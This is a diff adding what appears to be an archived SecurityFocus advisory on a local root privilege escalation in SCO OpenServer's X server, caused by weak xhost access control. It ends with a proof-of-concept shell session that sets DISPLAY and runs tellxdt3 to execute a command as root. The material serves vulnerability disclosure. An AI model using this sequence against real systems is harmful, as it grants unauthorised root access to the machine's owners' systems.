@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/2731/info
+
+OpenServer is a Unix based operating system distributed by Santa Cruz Operations.
+
+A problem in access control of the X server could allow a local user to gain elevated privileges. When the X Window System is started via the xhost script, insufficient xhost access control allows a user to execute commands on the desktop. This can be exploited by setting the display environment variable, and using the tellxdt3 program.
+
+This problem makes it possible for a local user to execute commands as root. 
+
+$ pwd
+/usr/lib/X11/IXI/XDesktop/bin/i3sc0322
+$ DISPLAY=localhost:0
+$ export DISPLAY
+$ id
+uid=232(kevin) gid=101(supp) groups=101(supp),50(group)
+$ ./tellxdt3 /usr/bin/id
+*** Can't open message catalogue XDesktop3
+uid=0(root) gid=3(sys) groups=3(sys),1(other) 
